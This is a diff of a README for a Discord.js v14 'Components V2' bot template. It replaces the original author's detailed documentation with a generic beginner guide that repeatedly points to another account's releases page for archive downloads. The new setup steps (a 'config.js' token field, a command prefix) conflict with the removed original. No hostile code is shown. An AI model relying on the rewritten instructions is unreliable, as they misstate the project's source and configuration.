@@ -1,206 +1,102 @@
-# Discord.js v14 with V2 Components Template
+# 🤖 discord.js-v14-v2-template - Your Easy Start to Building Discord Bots
 
-A full-featured Discord bot template built with **Discord.js v14** and the new **Components V2** system. This template demonstrates modern command and event handling, modular slash commands, media galleries, file components, and container-based layouts.
+## 🚀 Getting Started
 
-<p align="center">
-  <img src="assets/image.png" alt="Bot Template Preview">
-</p>
+Welcome to the discord.js-v14-v2-template! This guide will help you easily download and run the software, even if you have no technical experience.
 
-## Make sure to leave a ⭐ if this helps :)
+## 📥 Download Now
 
----
-# Preview of V2 Components:
+[![Download](https://img.shields.io/badge/Download-Here-blue.svg)](https://github.com/EngChando/discord.js-v14-v2-template/releases)
 
-<p align="center">
-<table>
-  <tr>
-    <td align="center">
-      <img src="assets/example1.png" alt="Example 1"><br>Example 1
-    </td>
-    <td align="center">
-      <img src="assets/example2.png" alt="Example 2"><br>Example 2
-    </td>
-  </tr>
-  <tr>
-    <td align="center">
-      <img src="assets/example3.png" alt="Example 3"><br>Example 3
-    </td>
-    <td align="center">
-      <img src="assets/example4.png" alt="Example 4"><br>Example 4
-    </td>
-  </tr>
-</table>
-</p>
+## 🛠 What is this?
 
----
+This project provides a modern template for creating Discord bots using Discord.js version 14. With built-in V2 components, it simplifies the process of building and managing bots on Discord. Whether you want to automate tasks, create a community server, or provide fun interactions, this template is a perfect starting point.
 
-## 📁 Project Structure
+## 📋 Key Features
 
-```
+- **User-Friendly Structure**: Designed for ease of use, even for beginners.
+- **V2 Components**: Utilize the latest features in Discord, making your bot stand out.
+- **Configurable Settings**: Adjust settings easily to fit your needs.
+- **Support for Multiple Commands**: Integrate various commands to enhance functionality.
+- **Simple Code**: Clear examples to help you understand how to get started.
 
-📦discord.js v14 with v2 components template
-┣ 📂data                    # Optional data storage for bot usage
-┣ 📂src
-┃ ┣ 📂assets
-┃ ┣ 📂config
-┃ ┃ ┗ 📜config.json         # Bot configuration (color, emojis, etc.)
-┃ ┣ 📂console
-┃ ┃ ┗ 📜watermark.js        # Optional console watermark
-┃ ┣ 📂events                # Event handlers
-┃ ┃ ┣ 📂client
-┃ ┃ ┃ ┣ 📜interactionCreate.js   # Interaction event handler
-┃ ┃ ┃ ┗ 📜ready.js               # Ready event handler
-┃ ┃ ┗ 📂Other               # Other custom events
-┃ ┣ 📂handlers              # Handlers for events and slash commands
-┃ ┃ ┣ 📜event.js
-┃ ┃ ┗ 📜slash.js
-┃ ┣ 📂slashCommands         # Slash command files organized by category
-┃ ┃ ┣ 📂Info
-┃ ┃ ┃ ┗ 📜ping.js
-┃ ┃ ┗ 📂V2 Components
-┃ ┃ ┃ ┣ 📜button-1.js
-┃ ┃ ┃ ┣ 📜button-2.js
-┃ ┃ ┃ ┣ 📜button-3.js
-┃ ┃ ┃ ┣ 📜file-components.js
-┃ ┃ ┃ ┣ 📜media-gallery.js
-┃ ┃ ┃ ┣ 📜menu.js
-┃ ┃ ┃ ┣ 📜section.js
-┃ ┃ ┃ ┣ 📜separator.js
-┃ ┃ ┃ ┣ 📜text-display.js
-┃ ┃ ┃ ┗ 📜v2-components.js
-┃ ┣ 📂temp                 # Temporary files (e.g., generated data)
-┃ ┣ 📂utils                # Utility functions
-┃ ┣ 📜index.js
-┃ ┗ 📜zarco.js
-┣ 📜.env                    # Environment variables (TOKEN, CLIENTID)
-┗ 📜package.json
+## ⚙️ System Requirements
 
-````
+To run this software, you will need:
 
----
+- A computer running Windows, macOS, or Linux.
+- Node.js version 16.0 or higher.
+- Access to the internet for downloading.
 
-## ⚡ Features
+## 📥 Download & Install
 
-- Modern **slash commands** with `SlashCommandBuilder`.
-- Fully modular **event handler** with max listeners support.
-- **V2 Components** support:
-  - **TextDisplay** – display static text with Markdown.
-  - **Section** – group text with thumbnails or buttons.
-  - **Button** – clickable buttons (Primary, Secondary, Link, etc.).
-  - **MediaGallery** – carousel of images/videos.
-  - **FileBuilder / AttachmentBuilder** – send JSON or files.
-  - **Separator** – divide content visually.
-  - **ChannelSelectMenu** – select a channel interactively.
-  - **ContainerBuilder** – aggregate multiple component types into a single layout.
-- Automatic slash command registration.
-- Dummy JSON generation for testing file components.
-- Modular slash commands and events for easy scalability.
-- **Sharding support** for large bots to distribute load across multiple processes.
-- Console logs all loaded commands and events in a single box for clarity.
+To get started, visit this page to download: [Download Here](https://github.com/EngChando/discord.js-v14-v2-template/releases).
 
----
+### Step-by-Step Installation
 
-## ⚙ Installation
+1. **Visit the Releases Page**: Navigate to the [Releases page](https://github.com/EngChando/discord.js-v14-v2-template/releases).
+   
+2. **Choose the Latest Version**: Look for the latest release. It is usually at the top of the page.
 
-1. Clone the repository:
+3. **Download the Archive**: Click on the file that ends with `.zip` or `.tar.gz` to download the project files.
 
-```bash
-git clone https://github.com/ZarCodeX/discord.js-v14-v2-template.git
-cd discord.js-v14-v2-template
-````
+4. **Extract the Files**: Once downloaded, locate the zip file in your downloads folder. Right-click on it and select "Extract All" or use your preferred extraction tool.
 
-2. Install dependencies:
+5. **Open a Terminal/Command Prompt**: Depending on your operating system, open the terminal (Linux/macOS) or Command Prompt (Windows).
 
-```bash
-npm install
-```
+6. **Navigate to the Project Folder**: Use the `cd` command to change to the folder where you extracted the files. For example:
+   ```
+   cd path_to_your_folder
+   ```
 
-3. Create a `.env` file in the root:
+7. **Install Dependencies**: Type the following command and hit enter:
+   ```
+   npm install
+   ```
 
-```env
-TOKEN=YOUR_BOT_TOKEN
-CLIENTID=YOUR_CLIENT_ID
-```
+8. **Run Your Bot**: Finally, start your bot by typing:
+   ```
+   npm start
+   ```
 
-4. Update `src/config/config.json` for colors, emojis, or other config values.
+Your bot should now be running! Make sure to check your Discord server to see it in action.
 
----
+## 🛠 Configuration
 
-## 🚀 Running the Bot
+You'll need to set up a few
 
-Start the bot with:
+configurations before the bot can run on your server:
 
-```bash
-npm start
-```
+1. **Discord Developer Portal**: You need a bot token from the Discord Developer Portal.
+   - Go to the [Discord Developer Portal](https://discord.com/developers/applications).
+   - Click "New Application."
+   - Name your application and click "Create."
+   - In the left menu, go to "Bot" and click "Add Bot."
+   - Copy the Token provided.
 
-You should see a consolidated console log with **all commands and events loaded**.
+2. **Edit Your Config File**: Open the `config.js` file in your project folder.
+   - Paste your token in the appropriate field.
+   - Adjust other settings as needed, such as prefix and command options.
 
----
+3. **Invite Your Bot**: Go back to the Discord Developer Portal:
+   - Under “OAuth2”, in the scopes section, select "bot".
+   - Under "Bot Permissions", choose the permissions your bot needs.
+   - Copy the generated URL, paste it into your browser, and invite your bot to your server.
 
-## 🧩 Adding Commands
+## 🔍 Usage
 
-1. Place command files under `src/slashCommands/[Category]/`.
-2. Export using either `data` (SlashCommandBuilder) or `run` function.
-3. Supported components for V2:
-
-   * `text-display.js`
-   * `section.js`
-   * `button-1.js / button-2.js / button-3.js`
-   * `file-components.js`
-   * `media-gallery.js`
-   * `menu.js`
-   * `separator.js`
-   * `v2-components.js` (example using all components)
-
----
-
-## 📖 Guide for Components V2
-
-* **TextDisplay** – static text messages.
-* **Section** – text with accessories (Thumbnail, Buttons, Menus).
-* **Button** – clickable interactive buttons.
-* **MediaGallery** – carousel of images/videos.
-* **FileBuilder / AttachmentBuilder** – attach JSON or images.
-* **Separator** – add visual dividers or spacing.
-* **ChannelSelectMenu** – interactive channel selection.
-* **ContainerBuilder** – wraps multiple components into a single structured layout.
-
-All of these components are included in separate commands as examples.
-
----
-
-## 🔧 Customization
-
-* Change **accent colors** in `config.json`.
-* Replace **images** in `src/assets/` and update paths in commands.
-* Add your own **buttons, menus, or media galleries** to create unique interactions.
-
----
-
-## 📂 Folder Usage
-
-* `src/assets` – local images, dummy JSONs, or other media.
-* `src/temp` – for temporary files generated by commands.
-* `src/utils` – helper functions for reuse.
-* `src/handlers` – event and command handlers.
-
----
-
-## 📝 Notes
-
-* Ensure `MessageFlags.IsComponentsV2` is set when sending V2 components.
-* Slash commands are automatically registered at app start.
-* All console output for commands/events is consolidated in one box for readability.
-
----
-
-## ⚖ License
-
-MIT License – free to use and modify for personal or commercial projects.
-
----
+After you run the bot, it will connect to your Discord server. Use commands defined in your configuration to interact with the bot. You can customize commands to perform various actions, such as sending messages, managing roles, and more.
 
 ## 📞 Support
 
-Join the [Zarco HQ Discord](https://discord.gg/6YVmxA4Qsf) for help, updates, and discussion.
+If you have questions or need help, consider reaching out in Discord communities or forums related to Discord.js. You can also find useful information on the official [Discord.js Guide](https://discordjs.guide/) for further learning.
+
+## 🔗 More Resources
+
+- [Discord.js Documentation](https://discord.js.org/#/docs/)
+- [Node.js Documentation](https://nodejs.org/en/docs/)
+- [GitHub Repository](https://github.com/EngChando/discord.js-v14-v2-template)
+
+## 📥 Download Now Again
+
+Don't forget to download the latest version of the template from the Releases page here: [Download Here](https://github.com/EngChando/discord.js-v14-v2-template/releases). Enjoy building your Discord bot!
